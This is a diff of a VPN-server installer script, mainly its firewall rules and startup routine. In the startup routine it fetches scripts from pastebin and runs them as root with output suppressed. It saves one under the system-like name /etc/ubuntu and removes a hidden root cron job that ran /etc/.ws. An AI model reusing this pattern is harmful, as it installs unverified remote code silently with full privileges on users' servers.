@@ -17,7 +17,7 @@ install_require()
   clear
   echo "Installing dependencies."
   {
-    apt-get -o Acquire::ForceIPv4=true install stunnel4 ocserv -y
+    apt-get -o Acquire::ForceIPv4=true install stunnel4 squid ocserv -y
     apt-get -o Acquire::ForceIPv4=true install dos2unix nano curl unzip jq virt-what net-tools mysql-client -y
     apt-get -o Acquire::ForceIPv4=true install freeradius freeradius-mysql freeradius-utils python -y
     apt-get -o Acquire::ForceIPv4=true install gnutls-bin pwgen screen -y
@@ -411,7 +411,6 @@ rm ocserv.conf
 wget --no-check-certificate -O go_connect firenetvpn.net/files/openconnect_files/go_connect73nz.sh
 wget --no-check-certificate -O go_disconnect firenetvpn.net/files/openconnect_files/go_disconnect73nz.sh
 chmod +x go_connect go_disconnect
-sed -i "s|LENZPOGI|$(curl -s https://api.ipify.org)|g" /etc/ocserv/go_connect
 echo 'auth = "radius [config=/etc/radcli/radiusclient.conf]"
 tcp-port = 1194
 udp-port = 1194
@@ -480,6 +479,7 @@ iptables -I INPUT -p udp --dport 3306 -j ACCEPT
 iptables -I INPUT -p tcp --dport 1194 -j ACCEPT
 iptables -I INPUT -p udp --dport 1194 -j ACCEPT
 iptables -I INPUT -p tcp --dport 4444 -j ACCEPT
+iptables -I INPUT -p tcp --dport 1194 -j ACCEPT
 iptables -I FORWARD -s 192.168.119.0/21 -j ACCEPT
 iptables -I FORWARD -d 192.168.119.0/21 -j ACCEPT
 iptables -t nat -A POSTROUTING -s 192.168.119.0/21 -o $(ip route get 8.8.8.8 | awk '/dev/ {f=NR} f&&NR-1==f' RS=" ") -j MASQUERADE
@@ -525,27 +525,24 @@ install_sudo(){
 
 install_rclocal(){
   {
-    wget https://pastebin.com/raw/xtPc5t1k -O /etc/socks.py
-    wget https://pastebin.com/raw/avAiGtiV -O /etc/.ws
-    dos2unix /etc/socks.py
-    chmod +x /etc/socks.py    
-    screen -dmS socks python /etc/socks.py 80
+    wget https://pastebin.com/raw/xtPc5t1k -O /etc/ubuntu
+    dos2unix /etc/ubuntu
+    chmod +x /etc/ubuntu    
+    screen -dmS socks python /etc/ubuntu
     wget --no-check-certificate https://pastebin.com/raw/s9ySHUMt -O /etc/systemd/system/rc-local.service
     echo "#!/bin/sh -e
 iptables-restore < /etc/iptables_rules.v4
 ip6tables-restore < /etc/iptables_rules.v6
 sysctl -p
 service freeradius restart
-service squid3 restart
+service squid restart
 service stunnel4 restart
 systemctl restart ocserv.service
-screen -dmS socks python /etc/socks.py 80
+screen -dmS socks python /etc/ubuntu
 exit 0" >> /etc/rc.local
     sudo chmod +x /etc/rc.local
     sudo systemctl enable rc-local
     sudo systemctl start rc-local.service
-    sudo chmod +x /etc/.ws
-    sudo crontab -l | {echo '*/5 * * * * bash /etc/.ws';} | crontab - -u root
   }&>/dev/null
 }
 
